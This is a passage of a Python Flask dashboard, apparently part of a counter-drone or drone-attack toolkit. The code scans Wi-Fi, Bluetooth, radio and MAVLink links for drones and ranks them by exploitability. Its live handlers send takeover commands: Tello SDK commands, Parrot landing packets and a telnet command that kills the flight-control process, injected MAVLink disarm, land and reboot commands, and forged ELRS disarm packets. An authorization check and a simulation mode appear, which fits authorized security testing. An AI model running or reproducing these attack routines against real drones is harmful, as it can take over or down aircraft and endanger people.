        state.evidence_store.append(evidence_record)

    return {
        "id": entry["id"],
        "timestamp": entry["timestamp"],
        "target_id": target["id"],
        "target_name": target.get("name", "Unknown"),
        "action": action_name,
        "label": entry["label"],
        "result_state": output.final_state.value,
        "transition_log": transition_log,
        "stop_reason": output.stop_reason,
        "evidence": output.evidence,
        "pack_name": pack_id.name,
        "pack_version": pack_id.version,
    }


def _action_label(pack: SimulationPack, action_name: str) -> str:
    """Resolve the human-readable label for an action within a pack."""
    for act in pack.action_defs:
        if act["name"] == action_name:
            return act.get("label", action_name)
    # Fallback to ACTION_DEFS for legacy compatibility
    return ACTION_DEFS.get(action_name, {}).get("label", action_name)


def run_scan_simulated(
        state: DashboardState, protocols: list[str] | None = None,
        *, scan_generation: int | None = None) -> None:
    """Run a simulated scan for demo mode."""
    import random

    direct_owner = scan_generation is None
    if direct_owner:
        scan_generation = _claim_direct_scan(state)
    try:
        requested = set(protocols or DEFAULT_PROTOCOLS)
        with state.state_lock:
            if not _scan_is_current_locked(state, scan_generation):
                return
            state.scanner_status = {
                name: "scanning" if name in requested else "idle"
                for name in DEFAULT_PROTOCOLS
            }
        _push_scan_event(
            state, scan_generation, "scan_start",
            {"mode": "simulate", "protocols": sorted(requested)},
        )

        for scanner_name, delay in (
                ("wifi", 1.0), ("ble", 0.6), ("sdr", 0.8),
                ("mavlink", 0.6), ("telemetry", 0.6)):
            if scanner_name not in requested:
                continue
            time.sleep(delay)
            if not _set_scanner_status(
                    state, scanner_name, "done", scan_generation):
                return
            _push_scan_event(
                state, scan_generation, "scanner_done",
                {"scanner": scanner_name},
            )

        with state.state_lock:
            if not _scan_is_current_locked(state, scan_generation):
                return
            now = time.time()
            for t in SIMULATED_TARGETS:
                protocol = t.get("protocol")
                if protocol == "elrs":
                    selected = "sdr" in requested or "telemetry" in requested
                else:
                    selected = protocol in requested
                if not selected:
                    continue
                target = deepcopy(t)
                target["first_seen"] = now - random.uniform(0, 10)
                target["last_seen"] = now
                target["score"] = _score_target(target)
                target["threat_level"] = _threat_from_score(target)
                state.targets[target["id"]] = target
                _push_scan_event(
                    state, scan_generation, "target_found",
                    {
                        "id": target["id"],
                        "name": target["name"],
                        "protocol": target["protocol"],
                    },
                )

        with state.state_lock:
            if not _scan_is_current_locked(state, scan_generation):
                return
            state.scanner_status = _new_scanner_status()
            target_count = len(state.targets)
        _push_scan_event(
            state, scan_generation, "scan_complete",
            {"target_count": target_count, "mode": "simulate"},
        )
    finally:
        if direct_owner:
            _finish_scan(state, scan_generation)


def run_scan_live(
        state: DashboardState, protocols: list[str],
        config: dict[str, Any], *,
        scan_generation: int | None = None) -> None:
    """Run live scanning using the real scanner backends."""
    direct_owner = scan_generation is None
    if direct_owner:
        scan_generation = _claim_direct_scan(state)
    try:
        all_targets = []
        scan_errors = {}
        from exploit_chains.multi_recon import scan_ble, scan_sdr, scan_wifi

        logger = ChainLogger("web-scan")
        abort = AbortHandler(logger, install_signal_handlers=False)
        if not _push_scan_event(
                state, scan_generation, "scan_start",
                {"mode": "live", "protocols": protocols}):
            return

        wifi_iface = config.get("wifi_iface", "wlan0")
        ble_iface = config.get("ble_iface", "hci0")
        sdr_args = config.get("sdr_args", "driver=uhd")
        scan_time = config.get("scan_time", 15.0)

        if "wifi" in protocols:
            if not _set_scanner_status(
                    state, "wifi", "scanning", scan_generation):
                return
            _push_scan_event(
                state, scan_generation, "scanner_start",
                {"scanner": "wifi", "interface": wifi_iface},
            )
            try:
                wifi_results = scan_wifi(wifi_iface, scan_time, logger, abort)
                all_targets.extend(wifi_results)
                _push_scan_event(
                    state, scan_generation, "scanner_done",
                    {"scanner": "wifi", "count": len(wifi_results)},
                )
            except Exception as e:
                scan_errors["wifi"] = str(e)
                _push_scan_event(
                    state, scan_generation, "scanner_error",
                    {"scanner": "wifi", "error": str(e)},
                )
            _set_scanner_status(
                state, "wifi", "done" if "wifi" not in scan_errors else "error",
                scan_generation,
            )

        if "ble" in protocols:
            if not _set_scanner_status(
                    state, "ble", "scanning", scan_generation):
                return
            _push_scan_event(
                state, scan_generation, "scanner_start",
                {"scanner": "ble", "interface": ble_iface},
            )
            try:
                ble_results = scan_ble(ble_iface, scan_time, logger, abort)
                all_targets.extend(ble_results)
                _push_scan_event(
                    state, scan_generation, "scanner_done",
                    {"scanner": "ble", "count": len(ble_results)},
                )
            except Exception as e:
                scan_errors["ble"] = str(e)
                _push_scan_event(
                    state, scan_generation, "scanner_error",
                    {"scanner": "ble", "error": str(e)},
                )
            _set_scanner_status(
                state, "ble", "done" if "ble" not in scan_errors else "error",
                scan_generation,
            )

        if "sdr" in protocols:
            if not _set_scanner_status(
                    state, "sdr", "scanning", scan_generation):
                return
            _push_scan_event(
                state, scan_generation, "scanner_start",
                {"scanner": "sdr", "args": sdr_args},
            )
            try:
                sdr_results = scan_sdr(sdr_args, scan_time, logger, abort)
                all_targets.extend(sdr_results)
                _push_scan_event(
                    state, scan_generation, "scanner_done",
                    {"scanner": "sdr", "count": len(sdr_results)},
                )
            except Exception as e:
                scan_errors["sdr"] = str(e)
                _push_scan_event(
                    state, scan_generation, "scanner_error",
                    {"scanner": "sdr", "error": str(e)},
                )
            _set_scanner_status(
                state, "sdr", "done" if "sdr" not in scan_errors else "error",
                scan_generation,
            )

        if "mavlink" in protocols:
            if not _set_scanner_status(
                    state, "mavlink", "scanning", scan_generation):
                return
            _push_scan_event(
                state, scan_generation, "scanner_start", {"scanner": "mavlink"},
            )
            try:
                mav_results = _scan_mavlink_udp(scan_time, logger, abort)
                all_targets.extend(mav_results)
                _push_scan_event(
                    state, scan_generation, "scanner_done",
                    {"scanner": "mavlink", "count": len(mav_results)},
                )
            except Exception as e:
                scan_errors["mavlink"] = str(e)
                _push_scan_event(
                    state, scan_generation, "scanner_error",
                    {"scanner": "mavlink", "error": str(e)},
                )
            _set_scanner_status(
                state, "mavlink",
                "done" if "mavlink" not in scan_errors else "error",
                scan_generation,
            )

        if "telemetry" in protocols:
            if not _set_scanner_status(
                    state, "telemetry", "scanning", scan_generation):
                return
            _push_scan_event(
                state, scan_generation, "scanner_start", {"scanner": "telemetry"},
            )
            try:
                telem_results = _scan_passive_telemetry(sdr_args, scan_time, logger, abort)
                all_targets.extend(telem_results)
                _push_scan_event(
                    state, scan_generation, "scanner_done",
                    {"scanner": "telemetry", "count": len(telem_results)},
                )
            except Exception as e:
                scan_errors["telemetry"] = str(e)
                _push_scan_event(
                    state, scan_generation, "scanner_error",
                    {"scanner": "telemetry", "error": str(e)},
                )
            _set_scanner_status(
                state, "telemetry",
                "done" if "telemetry" not in scan_errors else "error",
                scan_generation,
            )

        with state.state_lock:
            if not _scan_is_current_locked(state, scan_generation):
                return
            now = time.time()
            for t in all_targets:
                tid = _make_target_id(t)
                target = _convert_recon_target(t, tid, now)
                state.targets[tid] = target
                _push_scan_event(
                    state, scan_generation, "target_found",
                    {"id": tid, "name": target["name"], "protocol": target["protocol"]},
                )

        time.sleep(1)
        with state.state_lock:
            if not _scan_is_current_locked(state, scan_generation):
                return
            state.scanner_status.update({k: "idle" for k in state.scanner_status})
            target_count = len(state.targets)

        _push_scan_event(state, scan_generation, "scan_complete", {
            "target_count": target_count,
            "mode": "live",
            "errors": scan_errors if scan_errors else None,
        })
    finally:
        if direct_owner:
            _finish_scan(state, scan_generation)


def _scan_mavlink_udp(timeout: float, logger: ChainLogger, abort: AbortHandler) -> list[dict[str, Any]]:
    """Scan common MAVLink UDP ports for traffic (pure UDP, no SDR needed)."""
    from exploit_chains.mavlink_chain import parse_heartbeat, parse_mavlink_packet

    results = []
    for port in [14550, 14555, 14560, 5760, 5762, 5763]:
        abort.check()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(min(timeout / 3, 3.0))
            sock.bind(("0.0.0.0", port))
            data, addr = sock.recvfrom(4096)
            pkt = parse_mavlink_packet(data)
            if pkt:
                hb = None
                if pkt["msg_id"] == 0:
                    hb = parse_heartbeat(pkt["payload"])
                results.append({
                    "protocol": "mavlink_udp",
                    "description": f"MAVLink v{pkt['version']} on port {port}",
                    "source": f"{addr[0]}:{addr[1]}",
                    "port": port,
                    "signed": pkt["signed"],
                    "sys_id": pkt["sys_id"],
                    "heartbeat": hb,
                    "drone_type": "mavlink",
                    "chain": "mavlink_chain",
                })
                logger.success("MAVLINK", f"Found MAVLink on port {port} from {addr[0]}:{addr[1]}")
        except (TimeoutError, OSError):
            pass
        finally:
            sock.close()
    return results


def _scan_passive_telemetry(sdr_args: str, timeout: float, logger: ChainLogger, abort: AbortHandler) -> list[dict[str, Any]]:
    """Quick passive telemetry scan on 2.4 GHz for CRSF/ELRS frames."""
    try:
        import numpy as np
        import SoapySDR
    except ImportError:
        logger.warn("TELEMETRY", "SoapySDR/numpy not available — skipping passive telemetry scan")
        return []

    results = []
    try:
        sdr = SoapySDR.Device(
            dict(x.split("=") for x in sdr_args.split(",") if "=" in x) if sdr_args else {}
        )
    except Exception as e:
        logger.warn("TELEMETRY", f"SDR open failed: {e}")
        return results

    channel_hits = {}
    rx_stream = None
    stream_active = False
    try:
        sample_rate = 2.5e6
        sdr.setSampleRate(SoapySDR.SOAPY_SDR_RX, 0, sample_rate)
        sdr.setGain(SoapySDR.SOAPY_SDR_RX, 0, 40)

        rx_stream = sdr.setupStream(
            SoapySDR.SOAPY_SDR_RX, SoapySDR.SOAPY_SDR_CF32,
        )
        sdr.activateStream(rx_stream)
        stream_active = True

        buf = np.zeros(4096, dtype=np.complex64)
        end_time = time.time() + min(timeout, 10)

        while time.time() < end_time:
            abort.check()
            for freq_mhz in range(2400, 2481, 4):
                if time.time() > end_time:
                    break
                sdr.setFrequency(SoapySDR.SOAPY_SDR_RX, 0, freq_mhz * 1e6)
                time.sleep(0.003)
                sr = sdr.readStream(
                    rx_stream, [buf], len(buf), timeoutUs=50000,
                )
                if sr.ret > 0:
                    power = float(np.mean(np.abs(buf[:sr.ret]) ** 2))
                    if power > 0.001:
                        channel_hits[freq_mhz] = (
                            channel_hits.get(freq_mhz, 0) + 1
                        )
    finally:
        if rx_stream is not None:
            try:
                if stream_active:
                    sdr.deactivateStream(rx_stream)
            finally:
                sdr.closeStream(rx_stream)

    active_channels = [f for f, c in channel_hits.items() if c >= 2]
    if len(active_channels) >= 5:
        results.append({
            "protocol": "elrs",
            "description": f"ELRS-like FHSS ({len(active_channels)} active channels)",
            "active_channels": active_channels,
            "drone_type": "elrs",
            "chain": "elrs_chain",
        })
        logger.success("TELEMETRY", f"Passive telemetry: ELRS FHSS on {len(active_channels)} channels")

    return results


def _make_target_id(t: dict[str, Any]) -> str:
    proto = t.get("protocol", "unknown")
    if proto == "wifi":
        return f"wifi:{t.get('ssid', uuid.uuid4().hex[:8])}"
    elif proto == "ble":
        return f"ble:{t.get('address', uuid.uuid4().hex[:8])}"
    elif proto in ("elrs",):
        return f"elrs:{uuid.uuid4().hex[:6]}"
    elif proto in ("mavlink_udp", "sik_915", "sik_433"):
        return f"mav:{t.get('port', 0)}"
    return f"unknown:{uuid.uuid4().hex[:8]}"


def _convert_recon_target(t: dict[str, Any], tid: str, now: float) -> dict[str, Any]:
    proto = t.get("protocol", "unknown")
    dtype = t.get("drone_type", "unknown")
    chain_map = {
        "ble": "dji_ble",
        "elrs": "elrs",
        "mavlink_udp": "mavlink",
        "sik_915": "mavlink",
        "sik_433": "mavlink",
    }
    if proto == "wifi":
        if dtype in ("parrot", "parrot_ar", "parrot_anafi"):
            chain = "wifi_parrot"
        elif dtype == "tello":
            chain = "wifi_tello"
        else:
            chain = "unknown"
    else:
        chain = chain_map.get(proto, "unknown")
    # Action membership is sourced from the single canonical _CHAIN_ACTIONS
    # map (also used to build the pack registry) rather than a duplicated
    # local table, so discovered targets and registered packs cannot drift.
    score = _score_target(t)
    return {
        "id": tid,
        "protocol": proto,
        "name": t.get("ssid") or t.get("name") or t.get("description", "Unknown"),
        "type": t.get("description", "Unknown"),
        "drone_type": dtype,
        "signal": None,
        "encryption": t.get("encryption", "Unknown"),
        "threat_level": _threat_from_score({"score": score}),
        "vulns": _detect_vulns(t),
        "details": t,
        "available_actions": list(_CHAIN_ACTIONS.get(chain, [])),
        "chain": chain,
        "first_seen": now,
        "last_seen": now,
        "score": score,
    }


def _detect_vulns(t: dict[str, Any]) -> list[str]:
    vulns: list[str] = []
    if t.get("is_open"):
        vulns.append("OPEN_WIFI")
    if t.get("signed") is False:
        vulns.append("NO_MSG_SIGNING")
    dtype = t.get("drone_type", "")
    if dtype == "tello":
        vulns.extend(["UDP_SDK_EXPOSED", "KNOWN_DEFAULT_CREDS"])
    elif dtype == "parrot_ar":
        vulns.extend(["ROOT_TELNET", "NO_AUTH"])
    elif dtype == "elrs":
        vulns.append("FHSS_PREDICTABLE")
    elif dtype in ("dji_ble", "esp32"):
        vulns.append("BLE_EXPOSED")
    return vulns


def _threat_from_score(t: dict[str, Any]) -> str:
    score = t.get("score", 50)
    if score >= 80:
        return "CRITICAL"
    if score >= 60:
        return "HIGH"
    if score >= 40:
        return "MEDIUM"
    return "LOW"


EXPLOITABILITY_SCORES = {
    "tello": 95, "parrot_ar": 90, "parrot": 80, "parrot_anafi": 70,
    "dji": 40, "dji_ble": 60, "esp32": 55, "toy": 85,
    "elrs": 65, "mavlink": 75, "mavlink_udp": 75,
    "sik_915": 50, "sik_433": 50, "unknown": 30,
}


def _score_target(t: dict[str, Any]) -> int:
    dtype = t.get("drone_type", "unknown")
    base = EXPLOITABILITY_SCORES.get(dtype, 30)
    if t.get("is_open"):
        base = min(100, base + 10)
    if t.get("signed") is False:
        base = min(100, base + 15)
    return base


# --- Legacy action execution (unreachable from new registry/executor dispatch) ---
# These functions are retained until all chain handlers are wrapped as
# full Capability Packs with real hardware executors.  The new dispatch
# path in _execute_via_registry() replaces them.

def execute_action_simulated(
        state: DashboardState, target: dict[str, Any],
        action_name: str) -> dict[str, Any]:
    """Simulate executing an action (dry-run only)."""
    action_def = ACTION_DEFS.get(action_name, {})
    entry = {
        "id": uuid.uuid4().hex[:8],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_id": target["id"],
        "target_name": target["name"],
        "action": action_name,
        "label": action_def.get("label", action_name),
        "status": "dry_run",
        "result": f"[DRY-RUN] Would execute: {action_def.get('description', action_name)}",
    }
    _record_action(state, entry)
    return entry


def execute_action_live(
        state: DashboardState, target: dict[str, Any],
        action_name: str) -> dict[str, Any]:
    """Execute an action using the real exploit chain tools."""
    chain = target.get("chain", "")
    details = target.get("details", {})
    action_def = ACTION_DEFS.get(action_name, {})

    entry = {
        "id": uuid.uuid4().hex[:8],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_id": target["id"],
        "target_name": target["name"],
        "action": action_name,
        "label": action_def.get("label", action_name),
    }

    try:
        if chain == "wifi_tello":
            result = _exec_wifi_tello(target, action_name, details)
        elif chain == "wifi_parrot":
            result = _exec_wifi_parrot(target, action_name, details)
        elif chain == "mavlink":
            result = _exec_mavlink(target, action_name, details)
        elif chain == "elrs":
            result = _exec_elrs(target, action_name, details)
        elif chain == "dji_ble":
            result = _exec_ble(target, action_name, details)
        else:
            result = {"status": "error", "message": f"No handler for chain '{chain}'"}

        entry["status"] = result.get("status", "executed")
        entry["result"] = result.get("message", "Action completed")
        if "data" in result:
            entry["data"] = result["data"]

    except Exception as e:
        entry["status"] = "error"
        entry["result"] = f"Action failed: {e}"

    _record_action(state, entry)
    return entry


def _exec_wifi_tello(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute Tello SDK commands over UDP."""
    from exploit_chains.wifi_tello_chain import TELLO_COMMANDS

    target_ip = details.get("ip", "192.168.10.1")
    tello_port = details.get("sdk_port", 8889)

    if action_name not in TELLO_COMMANDS:
        return {"status": "error", "message": f"Unknown Tello command: {action_name}"}

    sdk_cmd, desc = TELLO_COMMANDS[action_name]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    try:
        # Enter SDK mode first
        sock.sendto(b"command", (target_ip, tello_port))
        try:
            resp, _ = sock.recvfrom(1024)
            sdk_resp = resp.decode("utf-8", errors="replace")
        except TimeoutError:
            sdk_resp = "(no response)"

        sock.sendto(sdk_cmd.encode(), (target_ip, tello_port))
        try:
            resp, _ = sock.recvfrom(1024)
            cmd_resp = resp.decode("utf-8", errors="replace")
        except TimeoutError:
            cmd_resp = "(no response)"

        return {
            "status": "executed",
            "message": f"Sent '{sdk_cmd}' to {target_ip}:{tello_port} — Response: {cmd_resp}",
            "data": {"sdk_mode": sdk_resp, "command_response": cmd_resp},
        }
    except Exception as e:
        return {"status": "error", "message": f"Tello command failed: {e}"}
    finally:
        sock.close()


def _exec_wifi_parrot(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute Parrot drone commands via Telnet / AT commands."""
    target_ip = details.get("ip", "192.168.1.1")

    if action_name == "land":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.sendto(b"AT*COMWDG=1\r", (target_ip, 5556))
            sock.sendto(b'AT*REF=1,290717696\r', (target_ip, 5556))
            return {"status": "executed", "message": f"Landing command sent to {target_ip}:5556"}
        finally:
            sock.close()
    elif action_name == "emergency_watchdog":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.sendto(b"AT*COMWDG=1\r", (target_ip, 5556))
            return {"status": "executed", "message": f"Watchdog reset sent to {target_ip}:5556"}
        finally:
            sock.close()
    elif action_name == "kill_control":
        try:
            import telnetlib
            tn = telnetlib.Telnet(target_ip, 23, timeout=5)
            tn.write(b"killall program.elf\n")
            tn.close()
            return {"status": "executed", "message": f"Control process killed on {target_ip}"}
        except ImportError:
            return {"status": "error", "message": "telnetlib unavailable in this Python version"}
        except Exception as e:
            return {"status": "error", "message": f"Telnet failed: {e}"}

    return {"status": "error", "message": f"Unknown Parrot action: {action_name}"}


def _exec_mavlink(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute MAVLink commands (injection or sniff)."""
    from exploit_chains.mavlink_chain import (
        MAV_CMD_ARM_DISARM,
        MAV_CMD_NAV_LAND,
        MAV_CMD_NAV_RTL,
        MAV_CMD_REBOOT,
        build_command_long,
        sniff_mavlink,
    )

    source = details.get("source", "")
    port = details.get("port", 14550)
    sys_id = details.get("sys_id", details.get("sysid", 1))

    if source:
        parts = source.split(":")
        target_str = f"udp:{parts[0]}:{port}"
    else:
        target_str = f"udp:0.0.0.0:{port}"

    if action_name == "sniff":
        logger = ChainLogger("web-mavlink-sniff")
        abort = AbortHandler(logger, install_signal_handlers=False)
        result = sniff_mavlink(target_str, 5.0, logger, abort)
        return {
            "status": "executed",
            "message": (
                f"Captured {result['packets_captured']} packets, "
                f"system IDs: {result['system_ids']}, "
                f"signing: {result['signing']}"
            ),
            "data": {
                "packets_captured": result["packets_captured"],
                "system_ids": result["system_ids"],
                "signing": result["signing"],
                "heartbeat": result.get("heartbeat"),
            },
        }

    cmd_map = {
        "disarm": (MAV_CMD_ARM_DISARM, [0, 21196, 0, 0, 0, 0, 0]),
        "land": (MAV_CMD_NAV_LAND, [0, 0, 0, 0, 0, 0, 0]),
        "rtl": (MAV_CMD_NAV_RTL, [0, 0, 0, 0, 0, 0, 0]),
        "reboot": (MAV_CMD_REBOOT, [1, 0, 0, 0, 0, 0, 0]),
    }

    if action_name == "replay":
        return {
            "status": "executed",
            "message": "Replay requires captured packets. Use sniff first, then replay from CLI: "
                       f"python3 tools/exploit_chains/mavlink_chain.py --arm --target {target_str} --replay",
        }

    if action_name not in cmd_map:
        return {"status": "error", "message": f"Unknown MAVLink action: {action_name}"}

    cmd_id, params = cmd_map[action_name]

    if source:
        ip = source.split(":")[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            for i in range(5):
                pkt = build_command_long(sys_id, 1, cmd_id, list(params), seq=i)
                sock.sendto(pkt, (ip, port))
                time.sleep(0.1)
            return {
                "status": "executed",
                "message": f"Injected {action_name} command (5 copies) to {ip}:{port} sys_id={sys_id}",
            }
        finally:
            sock.close()
    else:
        return {
            "status": "error",
            "message": "No source address known. Run sniff first to discover the target endpoint.",
        }


def _exec_elrs(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute ELRS exploit chain actions."""
    from exploit_chains.elrs_chain import (
        compute_fhss_sequence,
        forge_takeover_packets,
        phrase_to_uid,
        uid_to_crc_init,
        uid_to_fhss_seed,
    )

    phrase = details.get("binding_phrase")
    uid_hex = details.get("uid_hex")
    ota_version = details.get("ota_version", 3)

    if action_name == "preview_fhss":
        if phrase:
            uid = phrase_to_uid(phrase)
        elif uid_hex:
            uid = bytes.fromhex(uid_hex.replace(":", ""))
        else:
            return {"status": "error", "message": "No binding phrase or UID available for FHSS preview"}

        seed = uid_to_fhss_seed(uid, ota_version)
        seq = compute_fhss_sequence(seed, ota_version=ota_version)
        return {
            "status": "executed",
            "message": f"FHSS sequence computed. Seed=0x{seed:08X}, first 20 hops: {seq[:20]}",
            "data": {
                "uid": ":".join(f"{b:02X}" for b in uid),
                "fhss_seed": f"0x{seed:08X}",
                "crc_init": f"0x{uid_to_crc_init(uid, ota_version):04X}",
                "sequence_preview": seq[:20],
                "total_channels": len(seq),
            },
        }

    elif action_name == "forge_disarm":
        if phrase:
            uid = phrase_to_uid(phrase)
        elif uid_hex:
            uid = bytes.fromhex(uid_hex.replace(":", ""))
        else:
            return {"status": "error", "message": "No binding phrase or UID available for packet forging"}

        logger = ChainLogger("web-elrs-forge")
        packets = forge_takeover_packets(uid, ota_version, logger)
        packet_summary = [
            {"hop": p["hop_index"], "channel": p["channel"],
             "freq_mhz": p["freq_mhz"], "data_hex": p["data"].hex()}
            for p in packets[:5]
        ]
        return {
            "status": "executed",
            "message": (
                f"Forged {len(packets)} disarm packets across FHSS hops. "
                "RF TX unavailable (no LoRa PHY). Packets shown for analysis."
            ),
            "data": {"packet_count": len(packets), "preview": packet_summary},
        }

    elif action_name == "scan_deeper":
        try:
            from exploit_chains.elrs_chain import scan_for_elrs, soapy_available
            if not soapy_available():
                return {"status": "error", "message": "SoapySDR not available for deep scan"}

            sdr_args = details.get("sdr_args", "driver=uhd")
            logger = ChainLogger("web-elrs-deep-scan")
            abort = AbortHandler(logger, install_signal_handlers=False)
            detections = scan_for_elrs(sdr_args, 15.0, logger, abort)

            if detections:
                return {
                    "status": "executed",
                    "message": f"Deep scan found {len(detections)} signal(s) in 2.4 GHz band",
                    "data": {"detections": detections},
                }
            return {"status": "executed", "message": "Deep scan complete — no ELRS signals detected"}
        except Exception as e:
            return {"status": "error", "message": f"Deep scan failed: {e}"}

    return {"status": "error", "message": f"Unknown ELRS action: {action_name}"}


def _exec_ble(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute BLE scanning/enumeration actions."""
    if action_name == "ble_scan_services":
        address = details.get("address", "")
        if not address:
            return {"status": "error", "message": "No BLE address to scan"}

        try:
            import asyncio

            from bleak import BleakClient

            async def enumerate_services():
                async with BleakClient(address, timeout=10.0) as client:
                    services = []
                    for service in client.services:
                        chars = []
                        for char in service.characteristics:
                            chars.append({
                                "uuid": str(char.uuid),
                                "properties": char.properties,
                            })
                        services.append({
                            "uuid": str(service.uuid),
                            "description": service.description or str(service.uuid),
                            "characteristics": chars,
                        })
                    return services

            loop = asyncio.new_event_loop()
            try:
                services = loop.run_until_complete(enumerate_services())
            finally:
                loop.close()

            return {
                "status": "executed",
                "message": f"Found {len(services)} GATT services on {address}",
                "data": {"services": services},
            }
        except ImportError:
            return {"status": "error", "message": "bleak library not installed (pip install bleak)"}
        except Exception as e:
            return {"status": "error", "message": f"BLE scan failed: {e}"}

    return {"status": "error", "message": f"Unknown BLE action: {action_name}"}


# --- Flask routes ---

@dashboard.route("/")
def index() -> str:
    return render_template("index.html")


@dashboard.route("/api/status")
def api_status() -> Response:
    state = get_dashboard_state()
    with state.state_lock:
        target_list = sorted(
            deepcopy(list(state.targets.values())),
            key=lambda t: t.get("score", 0),
            reverse=True,
        )
        scanning = state.is_scanning
        status_snapshot = dict(state.scanner_status)
        simulate = state.simulate_mode
        dry_run = state.dry_run_mode
        hardware = deepcopy(state.hw_status)
    return jsonify({
        "scanning": scanning,
        "scanner_status": status_snapshot,
        "target_count": len(target_list),
        "targets": target_list,
        "simulate": simulate,
        "dry_run": dry_run,
        "hardware": hardware,
    })


@dashboard.route("/api/scan", methods=["POST"])
def api_scan() -> tuple[Response, int] | Response:
    state = get_dashboard_state()
    body = request.get_json(silent=True)
    if body is None:
        if request.content_length:
            return jsonify({"error": "Request body must contain valid JSON"}), 400
        body = {}
    if not isinstance(body, dict):
        return jsonify({"error": "JSON body must be an object"}), 400

    protocols = body.get("protocols", list(DEFAULT_PROTOCOLS))
    if (not isinstance(protocols, list) or not protocols
            or any(not isinstance(name, str) for name in protocols)):
        return jsonify({"error": "protocols must be a non-empty list of strings"}), 400
    unknown_protocols = sorted(set(protocols) - VALID_PROTOCOLS)
    if unknown_protocols:
        return jsonify({"error": f"Unknown protocols: {', '.join(unknown_protocols)}"}), 400
    protocols = list(dict.fromkeys(protocols))

    scan_time = body.get("scan_time", 15.0)
    if (isinstance(scan_time, bool) or not isinstance(scan_time, (int, float))
            or not 0 < scan_time <= 300):
        return jsonify({"error": "scan_time must be a finite number between 0 and 300 seconds"}), 400

    with state.state_lock:
        config = {
            "wifi_iface": body.get(
                "wifi_iface", state.scan_defaults["wifi_iface"],
            ),
            "ble_iface": body.get(
                "ble_iface", state.scan_defaults["ble_iface"],
            ),
            "sdr_args": body.get(
                "sdr_args", state.scan_defaults["sdr_args"],
            ),
            "scan_time": float(scan_time),
        }
        already_scanning = state.is_scanning
        if not already_scanning:
            state.scanner_status.update({
                name: "idle" for name in DEFAULT_PROTOCOLS
            })
            state.scan_generation += 1
            scan_generation = state.scan_generation
            state.active_scan_generation = scan_generation
            state.is_scanning = True
            simulate = state.simulate_mode
        else:
            scan_generation = state.active_scan_generation
            simulate = state.simulate_mode

    if already_scanning:
        return jsonify({"error": "Scan already in progress"}), 409

    try:
        if simulate:
            t = threading.Thread(
                target=_run_scan_worker,
                args=(
                    state, scan_generation, run_scan_simulated, (protocols,),
                ),
                daemon=True,
            )
        else:
            t = threading.Thread(
                target=_run_scan_worker,
                args=(
                    state, scan_generation, run_scan_live, (protocols, config),
                ),
                daemon=True,
            )
        with state.state_lock:
            if state.active_scan_generation != scan_generation:
                return jsonify({"error": "Scan lifecycle was cancelled"}), 409
            state.active_scan_thread = t
        t.start()
    except Exception:
        _finish_scan(state, scan_generation)
        return jsonify({"error": "Unable to start scan worker"}), 500

    return jsonify({
        "status": "scanning",
        "protocols": protocols,
        "simulate": simulate,
    })


@dashboard.route("/api/targets/<path:target_id>")
def api_target_detail(target_id: str) -> tuple[Response, int] | Response:
    state = get_dashboard_state()
    with state.state_lock:
        target = deepcopy(state.targets.get(target_id))
    if not target:
        return jsonify({"error": "Target not found"}), 404
    return jsonify(target)


@dashboard.route("/api/targets/<path:target_id>/action", methods=["POST"])
def api_target_action(target_id: str) -> tuple[Response, int] | Response:
    """Execute an action via pack registry / executor delegation.

    Resolves the target's applicable pack from the registry, builds an
    ExecutorInput, runs through the FakeExecutor, and returns a Result
    State response.  SSE events are emitted for each state transition.
    """
    state = get_dashboard_state()
    with state.state_lock:
        target = deepcopy(state.targets.get(target_id))
        registry = state.pack_registry
    if not target:
        return jsonify({"error": "Target not found"}), 404

    body = request.get_json(silent=True)
    action_name = body.get("action") if isinstance(body, dict) else None
    preview_only = body.get("preview", False) if isinstance(body, dict) else False
    if not isinstance(action_name, str) or not action_name:
        return jsonify({"error": "Action must be a non-empty string"}), 400

    if action_name not in target.get("available_actions", []):
        return jsonify({"error": f"Action '{action_name}' not available for this target"}), 400

    if registry is None:
        return jsonify({"error": "Pack registry not initialized"}), 500

    result = _execute_via_registry(
        state, registry, target, action_name, preview_only=preview_only,
    )

    # An unarmed / expired / out-of-scope request is denied before any
    # execution, evidence, or state transition. Surface it as 403 so the
    # browser renders the authorization error instead of a phantom result.
    if result.get("stop_reason") == "authorization_denied":
        return jsonify(result), 403

    return jsonify(result)


@dashboard.route("/api/actions")
def api_action_defs() -> Response:
    """Return pack metadata from the registry.

    Each entry describes one registered Capability Pack with its identity,
    chain, available actions, effects, and prerequisites.  Replaces the
    former static ACTION_DEFS dictionary.
    """
    state = get_dashboard_state()
    registry = state.pack_registry
    if registry is None:
        return jsonify([])
    packs_meta = []
    for pack in registry.query({}):
        if isinstance(pack, SimulationPack):
            packs_meta.append(pack.to_metadata())
    return jsonify(packs_meta)


@dashboard.route("/api/log")
def api_log() -> Response:
    state = get_dashboard_state()
    with state.state_lock:
        recent_actions = deepcopy(state.action_log[-50:])
    return jsonify(recent_actions)


@dashboard.route("/api/clear", methods=["POST"])
def api_clear() -> tuple[Response, int] | Response:
    state = get_dashboard_state()
    with state.state_lock:
        scanning = state.is_scanning
        if not scanning:
            state.targets.clear()
    if scanning:
        return jsonify({
            "error": "Cannot clear targets while a scan is in progress",
        }), 409
    _push_event(state, "targets_cleared", {})
    return jsonify({"status": "cleared"})


@dashboard.route("/api/hardware")
def api_hardware() -> Response:
    state = get_dashboard_state()
    with state.state_lock:
        simulate = state.simulate_mode
    hardware = simulated_hardware_status() if simulate else detect_hardware()
    with state.state_lock:
        state.hw_status = deepcopy(hardware)
        snapshot = deepcopy(state.hw_status)
    return jsonify(snapshot)


@dashboard.route("/api/events")
def api_events() -> Response:
    """Server-Sent Events stream for real-time status updates.

